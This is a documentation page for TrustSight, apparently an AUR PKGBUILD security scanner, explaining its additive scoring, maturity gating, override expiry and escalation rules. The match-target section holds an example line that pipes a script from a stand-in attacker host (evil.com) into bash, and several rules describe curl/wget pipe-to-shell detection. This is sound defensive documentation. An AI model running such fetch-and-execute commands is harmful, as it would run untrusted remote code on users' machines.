<!-- description: Why the score is additive evidence, how maturity gates novelty, how overrides expire, and why escalation only ever amplifies. -->

# Scoring and Verdicts


The score is an additive summary of evidence, not a probability. This page
explains why verification is declared rather than credited, how maturity gates
novelty on a cold database, how a suppression can expire, and why escalation
only ever amplifies a finding.

## Scoring Philosophy

The scoring system is designed around a single question: *how much new information does each signal carry?* Signals that fire on every package carry zero information. Signals that rarely fire and correlate with known threats carry the most.

### Evidence tiers (A/B/C/D)

Signals are grouped into four tiers:

| Tier | Basis | Availability | Example |
|------|-------|-------------|---------|
| **A : Structural** | Static analysis of the PKGBUILD | Always, no corpus needed | `curl \| bash`, base64 decode, variable source URL |
| **B : Priors** | Static source-host classification | Always, no corpus needed | `trusted_forge`, `official`, `raw_hosting`, `unknown`, `homograph_attack` |
| **C : History/Novelty** | Observation counts across corpus | Requires warm corpus (≥50 observations for full weight) | URL first seen globally, first seen in this package, new maintainer |
| **D : Verification** | Declared integrity metadata | Always | Checksum declared, PGP key declared, GPG signature source |

Structural signals (A) are always weighted; they don't depend on external data. Context signals (B) are configured static lists and a homograph check, not corpus-derived reputation. History signals (C) require observation; they are definitionally meaningless on run one. Verification signals (D) are reported at weight 0: they are claims the recipe makes, not facts the tool confirms.

### Why verification is declared, never scored

The naive design (described in the Dropbox paper that inspired the tool) scored
checksum-missing packages *higher*. This meant:

- A package **with** checksums scored **higher** than one without.
- A package with no checksums and no other signals scored **0**.

That is inverted, and TrustSight's first answer was to make verification
subtractive. That answer was also wrong, for a different reason.

Everything TrustSight sees is attacker-declared. Adding `validpgpkeys=(...)`,
pinning a `#commit=`, or routing through github.com costs an attacker nothing,
and TrustSight never fetches, so it never confirms that a declared key signs
anything or that a pinned commit contains what it claims. A signal an attacker
can assert for free must not be able to lower a score: the only reliable effect
of such a mechanism is buying points back for whoever bothers to read the rules.

So declared verification is emitted as **weight-0 findings in the `P`
namespace** and reported to the reader, who can check the claims in ways the
tool cannot:

| Signal | Finding | Weight |
|--------|---------|--------|
| checksums declared | `P001` | 0 |
| `validpgpkeys` declared | `P002` | 0 |
| signature source declared | `P003` | 0 |

The original inversion is fixed at source rather than paid back: H001 does not
fire on a `SKIP` that is mandatory for a VCS source, structurally uncheckable
for a signature file, or covered by declared PGP keys. Stopping the false
positive was the right fix. See
[B10](../security-design/security-model.md#b10-positive-evidence-is-reported-never-credited).

### Severity weights

Each rule carries a severity weight, derived from its information value:

| Severity | Weight |
|----------|--------|
| CRITICAL | 40 |
| HIGH | 25 |
| MEDIUM | 15 |
| LOW | 5 |
| INFO | 0 |

FATAL findings contribute weight 0 like any other finding. The score no longer jumps to 100 when one fires: the FATAL signal rides the verdict label (`Low (FATAL: R012)`) and the unsuppressible FATAL entry in `score_breakdown`.

### Pinning and source buckets

Pinning metadata is reported, not credited, for the same reason as verification:
a pin is a claim about a ref that TrustSight never resolves.

| Signal | Finding | Weight |
|--------|---------|--------|
| pinned to a commit | `P005` | 0 |
| pinned to a tag | `P006` | 0 |

`P006` is deliberately phrased as the weaker form. A tag can be repointed; a
commit hash cannot, which is why H033 exists.

Source bucket classification only ever adds:

| Bucket | Effect | Rationale |
|--------|--------|-----------|
| `trusted_forge` | 0 | GitHub, GitLab : neutral, reported as `P007` |
| `official` | 0 | Upstream official domains : neutral |
| `declared_upstream` | +5 | Unrecognised domain that is the package's own declared `url=` upstream |
| `raw_hosting` | +15 | Configured raw-content host : requires scrutiny |
| `unknown` | +20 | Unrecognised domain : requires scrutiny |
| `homograph_attack` | +30 | Visually confusable domain : high risk |

These are static configured buckets, not corpus-frequency classes; there is no
`self_hosted` bucket.

### Why popularity/votes are never a positive signal

The threat model is inverted. Compromise targets the popular. A widely-used package with thousands of votes is *more* valuable as a compromise target, not less. The xz utils lesson: the most dangerous backdoor in recent history targeted a widely-trusted, widely-used library. Popularity is not safety.

### Why maintainer identity is a change-detection key, never a reputation credential

Same lesson. A change of maintainer is a flag for investigation; it means the package is under new control. It is not a negative score by itself. Maintainer identity is tracked as a change-detection signal, not a reputation credential.

### Why weights are derived from corpus frequency, not asserted

Every scored rule is validated against corpus frequency. A rule that fires on
most packages is not signalling anything useful. H003 is LOW because it makes
the narrow, diff-aware claim that a newly added plain-HTTP source lacks newly
declared checksum backing, not because it matches a broad source-array shape.

### Rule design decisions

#### R001 and R002: why separate rules for curl and wget

Curl and wget are the two most common tools for fetching remote content in PKGBUILDs. Combining them into a single rule would make it harder to tune: a user who accepts wget pipe patterns but wants to block curl pipe patterns would have to disable the combined rule entirely. Separate rules per tool let users choose which network tools to allow.

Matched against resolved strings because the URL or flags might be in a variable. The pattern catches the pipe to a shell, not just the presence of curl or wget alone.

#### R012 and R013: why FATAL instead of CRITICAL

FATAL rules (R012 prompt injection, R013 unicode bidi, and a confirmed H056 IOC match) are fundamentally different from CRITICAL rules. A CRITICAL rule like `curl | bash` fires on a specific command pattern that is almost always malicious. A FATAL rule fires on a pattern that, when present, indicates active manipulation of the reviewer's perception.

Prompt injection and unicode bidi overrides are attacks on the reviewer, not on the build process. They attempt to hide what the PKGBUILD does. When these fire, the FATAL entry they leave in `score_breakdown` and the rule name in the verdict label (`Low (FATAL: R012)`) carry the signal, because a package that tries to deceive the reviewer cannot be trusted regardless of other signals. They contribute weight 0 to the additive score; the label and the unsuppressible breakdown entry are their entire effect. This is deliberate: the shipped FATALs target the reviewer reading the report rather than the build machine, so a lone heuristic FATAL misfire no longer reads as a Critical package. A consumer triaging on score should also look for FATAL entries in `score_breakdown`.

Low recall is acceptable for these rules. R012 has 17% detection on the labelled injection fixtures. It is a tripwire: when it fires, the package is almost certainly malicious. When it does not, nothing can be concluded.

#### H001 and H002: why checksum rules are hard-coded

Checksum integrity is foundational to the entire scoring system. Every other signal is evaluated in the context of whether checksums are present or disabled. Allowing users to disable H001 or H002 through `rules.toml` would produce misleading results: a package with `sha256sums=('SKIP')` that otherwise looks clean would score 0, but the missing checksum is itself a risk.

These rules are hard-coded in `src/trustsight/analysis/structural/_engine.py` and cannot be disabled through configuration. H001 has automatic justification detection: if the diff contains a VCS source (`git+https://`, `.git`), a signature file (`.sig`, `.asc`), a `validpgpkeys` declaration, or a DKMS reference, the severity is downgraded from HIGH (weight 25) to INFO (weight 0). The justification checks whether the checksum skip is structurally explained, not whether it is safe.

#### H004: why sudo detection requires command position

A naive `sudo` rule that matches anywhere in the PKGBUILD fires on comments, on text in `pkgdesc`, and on top-level variable assignments like `groups=('sudo')`. H004 is code-emitted and requires `sudo` at command position, where it has an effect. Corpus fire-rate analysis is what settles it: unfiltered `sudo` matching is a census signal rather than a risk signal.

#### C001, C002, C003: why code rules exist

Code rules (C-series) enforce structural invariants that cannot be expressed as a single regex match. C001 fires when a checksum changed without a source URL change and without a version bump: the checksum changed but nothing else did, which is anomalous. C002 is the same check but with a version bump present: normal during routine updates, recorded for audit only. C003 fires when source URLs changed without a version bump.

These rules are hard-coded because they depend on comparing multiple parsed fields (checksum state, source URL set, pkgver value). Writing them as TOML patterns would require embedding logic in regex, which is fragile and unreadable. The C-series namespace also prevents users from accidentally disabling structural invariants that the scoring model depends on.

#### Why match_target has two values

Rules matched against `resolved` strings see the post-variable-expansion PKGBUILD. This catches patterns where the malicious command is hidden behind a variable: `curl $url | $shell` in the diff line becomes `curl https://evil.com/hook.sh | bash` after resolution.

Rules matched against `raw_line` strings see the literal PKGBUILD text. This catches patterns in the structure of the PKGBUILD itself: a `sha256sums=('SKIP')` declaration, a unicode bidi override character in a string literal, or a `.install` file reference.

The two-target design exists because PKGBUILDs encode meaning in both their text (structure, declarations) and their resolved values (commands, URLs). A pattern like `sudo` is meaningful in the raw text (where it can be seen and reviewed) but meaningless when resolved (sudo is not a variable). A pattern like `curl | bash` is meaningful only after resolution (where the actual URL and shell are known).

## Cold Start and Maturity

TrustSight operates in two regimes: **cold DB** (first run, no history) and **warm DB** (established observation history). The behaviour is different by design.

### The two-regime problem

Novelty signals (tier C) depend on observation counts. On first run:

- Every URL is first-seen.
- Every maintainer is first-seen.
- Novelty fires on 100% of packages, which means it carries zero bits of information.

This is a cold-start problem. If novelty contributed at full weight from run one, every package audited on the first day would score higher than it should. Worse, the signal would be inversely useful: it would flag the most common, most well-known URLs (because they have not been seen in this specific database) while missing genuinely novel ones.

#### A concrete example

You install TrustSight for the first time and run `trustsight review`. Your package set includes `linux-lts` (a well-known kernel package), `firefox-bin` (a well-known browser), and `some-obscure-forum-package` that you installed years ago.

Without a maturity gate, all three would get novelty penalties for their source URLs being "first-seen". The kernel package's kernel.org URLs would be flagged as novel, even though they are among the most well-established sources in the AUR. The obscure package's unknown-domain URLs would receive the same weight as the kernel's. The novelty signal would be noise.

With the maturity gate, none of these novelty signals contribute until the
effective observation count is positive. Without an imported seed, the first
run is computed from structural rules (tier A) and domain classification (tier
B) only, which correctly flags the obscure package's unknown domain without
penalizing the kernel's trusted forge sources.

### Maturity gate

Novelty weights are scaled by a maturity factor:

```text
effective_weight = base_weight * min(1, observation_count / 50)
```

| Observations | Novelty weight contribution |
|-------------|---------------------------|
| 0 | 0 (inactive) |
| 25 | 50% of base weight |
| 50 | 100% of base weight |
| 100+ | 100% of base weight (capped) |

#### Why 50 observations

The 50-observation threshold is a heuristic derived from the cold-start dynamics of the AUR corpus. At 50 observations, the database has seen enough package updates to establish a baseline of common URLs. A URL that has not appeared in any of those 50 observations is legitimately unusual.

The linear ramp from 0 to 50 avoids a sharp cutoff. A threshold like "novelty activates at 50 observations" would produce a discontinuous jump: a package reviewed at 49 observations would score differently from one reviewed at 50, even though the database state is nearly identical. The linear ramp smooths the transition.

Below 50 observations, the novelty weight is linearly scaled. At 0 observations, novelty contributes 0.

### Novelty weight structure

| Novelty signal | Full weight (at maturity) | Why this weight |
|----------------|---------------------------|-----------------|
| `url_first_globally` | 10 | A URL never seen in any package is genuinely unusual. This is the strongest URL-novelty signal. |
| `url_first_in_package` | 5 | A URL new to this specific package but seen elsewhere. Weaker because it may just reflect a new package in your set. |
| `maintainer_first_in_package` | 15 | A maintainer never recorded for this package is a significant flag. Maintainer changes are a known attack vector (xz utils). The highest novelty weight reflects this. |

The maintainer-first weight is highest because a maintainer change without a corresponding announcement or discussion is a social-engineering red flag. Unlike URLs, which change routinely with version bumps, maintainer changes are rare and structurally significant.

### How novelty interacts with other evidence tiers

Novelty signals do not fire in isolation. They are evaluated alongside:

- **Structural signals (tier A) and context signals (tier B)**: a novel URL from a trusted forge is less concerning than a novel URL from an unknown domain.
- **Context signals (tier B)**: a `trusted_forge` domain adds nothing of its own (its bucket modifier is 0). Novelty on an `unknown` or `homograph` domain compounds with the bucket weight.
- **Verification signals (tier D)**: declared checksums and PGP signatures are report context only and do not affect novelty or score.

The interaction is additive, not multiplicative. Each signal contributes independently, so a package with a novel URL on an unknown domain with no checksum accumulates contributions from all three.

### The seed database

A cold database is not the usual state. TrustSight fetches and imports a
verified novelty seed on first run. The current published seed records 195,023
normalized source URLs, 43,815 maintainers, and 224,423 dependency names, plus a
bootstrap observation count. A maintainer row with `package_count = 0` is a
known alias, not an active maintainer; it stops the name being first-seen but
adds no package activity. Maturity uses the greater of that seed count and the
local analysis count, not a per-package count. See
[`trustsight seed-db`](../reference/cli.md#trustsight-seed-db).

Measured against the AUR mirror, the seed recognises **86%** of the source URLs in a package's most recent update. That figure falls off for older updates (62% mid-history, 20% for the oldest commit in a 30-commit window) because the seed is a snapshot of current `.SRCINFO` state, and historical versions used paths that no longer exist. Since a review always concerns the newest update, 86% is the number that matters in practice; corpus replays over deep history understate it.

The weights only have an effect where `observation_count` is populated. With no
observations the maturity multiplier is 0, and every novelty weight resolves to
zero whatever its configured value.

### The INCONCLUSIVE downgrade

When the final score is in the Medium range (21 to 50), maturity is below 0.5 (fewer than 25 recorded analyses, half of the 50 at which novelty reaches full weight), and nothing in the breakdown is HIGH, CRITICAL or FATAL, the verdict is downgraded from FLAGGED to INCONCLUSIVE. A single HIGH finding blocks the downgrade: the score is then held up by evidence, not by novelty.

The logic:
1. Compute the score normally.
2. If the score lands in the Medium band (21 to 50) and maturity is below 0.5, look at the severity of every entry in the breakdown.
3. If none of them is HIGH, CRITICAL or FATAL, nothing but weak signals is holding the score up.
4. Downgrade to INCONCLUSIVE: *"Score is Medium but nothing strong fired, and the database is too cold for novelty to be reliable."*

This prevents the tool from flagging packages based on weak signals. INCONCLUSIVE is not a pass or a fail; it is a signal that the tool cannot be confident in its assessment.

A coverage gap produces the same downgrade at any maturity, for a different reason: the run did not see the whole change. See [the security model](../security-design/security-model.md#b2-an-unflagged-verdict-is-never-issued-for-an-analysis-that-was-incomplete).

### Maturity and maintainer tracking

Maintainer novelty follows the same maturity curve as URL novelty. On first run, every maintainer change is recorded but contributes 0 to the score. As observations accumulate, maintainer novelty ramps in: a new maintainer for a well-established package at 50+ observations is flagged at full weight.

Maintainer tracking is per-package: a maintainer who maintains 100 packages will be "known" for each package individually as they are observed. A maintainer change on a package that has been observed 50 times is weighted fully, even if the same maintainer is new to that specific package.

### What the user sees

Without a seed, first-run scores are computed from structural signals (A) and
priors (B) only. History signals (C) contribute nothing until the effective
observation count rises. With a verified seed, Tier C may already be mature on
the first local run.

This means first-run scores are conservative; they catch structural threats (curl|bash, homograph domains) but will not flag a package solely because it has never been seen before. As the corpus accumulates observations, novelty signals phase in automatically.

The database warms up as you run `trustsight review`. Each run records the
current state of every outdated package. Novelty reaches full weight once the
effective observation count reaches 50.

## Override Tolerance

Suppressing a finding is a deliberate act: an operator says "I know about
this, stop telling me". It is a good feature. It is also, left alone, a
permanent one - and permanence is the problem.

This page explains the two things TrustSight does to keep a suppression from
becoming a place to hide.

### Where it comes from

The immune system has the same problem and the same answer. **Peripheral
tolerance** is how the body stops attacking its own tissue: self-reactive
cells are anergized. Crucially, that tolerance is not a one-time switch. It
is maintained by *continuous* self-signal. Take the signal away and tolerance
lapses.

The attack version is **socially induced tolerance**: a mimic that keeps
presenting the tolerizing signal stays invisible forever. A suppression
written once, that never has to justify itself again, is exactly that.

### Expiring a suppression

An override can carry an optional lifetime, in **observations** - recorded
analyses, not days:

```json
{ "rule_id": "H029", "package": "some-package", "reason": "...",
  "ttl_observations": 50 }
```

Once that many observations have passed since the override was written, it
**stops suppressing**. Two things happen:

- The finding comes back at full severity.
- The report names the expiry, so a quiet report can never mean both "no
  finding" and "a suppression quietly lapsed".

Expiry never touches a FATAL finding - those cannot be suppressed in the
first place.

### The indicator cross-check

Some overrides are only meant to hold while the package looks clean. Marking
one `requires_clear_indicators` makes it conditional:

```json
{ "rule_id": "C005", "package": "some-package", "reason": "...",
  "requires_clear_indicators": true }
```

If an active indicator matches the run, the override is downgraded to
**visible-only**: the finding renders in the terminal with both the override
and the corroboration noted, instead of being hidden. A suppression must
never hide a signal the run itself found.

### Why observations, not seconds

The lifetime is counted in recorded analyses, so the tool never consults a
clock it does not control and an expired override cannot be kept alive by a
skewed system time. It is the same discipline as the freshness marker and
campaign TTLs.

### Related

- [Campaign Alert Mode](detection-and-evidence.md) - the same expiry discipline
  applied to armed state.
- [Kinds of Alerts](detection-and-evidence.md)

## Escalation Licensing

A single weak signal is weak. A weak signal next to a confirming one is a
story. **Escalation licensing** lets a rule say "raise me a notch *if* one of
these other rules also fired" - and nothing more.

### Where it comes from

Borrowed from **T-cell help**. A B cell that has bound an antigen still needs
a licensed signal from a helper T cell before it commits to a full response.
Help focuses and amplifies the response. It does not create it: the B cell
already bound the antigen, and natural killer cells still destroy cells that
never presented one.

The autoimmune reading is the failure mode: treating *help* as
*authorization*. A signal that only says "this is real" must never be what
makes a finding fire in the first place.

### The one rule

A licensor only ever moves a finding **up one notch**:

```
LOW → MEDIUM → HIGH → CRITICAL
```

Never to FATAL. Never more than one notch, even if several licensors fire.
And if no licensor fires, the finding simply stands at its own severity - the
bump is lost, the finding is not. Evading the licensor can cost you the
escalation; it can never make the detection disappear.

The escalation is transparent: an escalated finding records which rules
licensed it.

### Star, not chain

Licensing is a star, not a ladder. A rule that is itself raised by another
rule cannot in turn raise a third. That keeps a single weak signal from
cascading an entire run upward through a chain of "and therefore".

### Missing help is also a signal

The mirror image matters too. If a finding fired whose rule *expects* a
licensor and none came, that is not evidence about the package - it is a
**tool-health** observation: a detector that usually travels with a partner
travelled alone. It is reported to the calibration output (like the other
M-series tool-health entries), weight 0, and never scored.

That is the design law in one line: **licensing amplifies, never authorizes;
help is a signal, and missing help is also a signal.**
